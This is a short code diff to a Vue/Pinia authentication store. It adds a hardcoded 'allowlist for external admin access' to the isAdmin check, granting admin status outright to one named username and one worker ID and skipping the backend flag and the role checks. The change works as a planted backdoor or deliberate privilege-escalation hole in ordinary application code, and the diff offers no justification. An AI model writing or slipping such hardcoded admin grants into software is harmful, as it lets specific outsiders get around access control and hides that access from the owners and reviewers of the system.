@@ -28,6 +28,11 @@ export const useAuthStore = defineStore('auth', () => {
   const isAdmin = computed(() => {
     // Check is_admin field first (from backend)
     if (user.value?.is_admin === true) return true
+    // Allowlist for external admin access
+    const normalizedUsername = (user.value?.username || '').toLowerCase()
+    if (['samuel_halomoan'].includes(normalizedUsername)) return true
+    const normalizedWorkerId = (user.value?.worker_id || '').toUpperCase()
+    if (['MW2400549'].includes(normalizedWorkerId)) return true
     // Fallback to checking roles
     if (!user.value?.roles) return false
     const roles = Array.isArray(user.value.roles) ? user.value.roles : [user.value.roles]
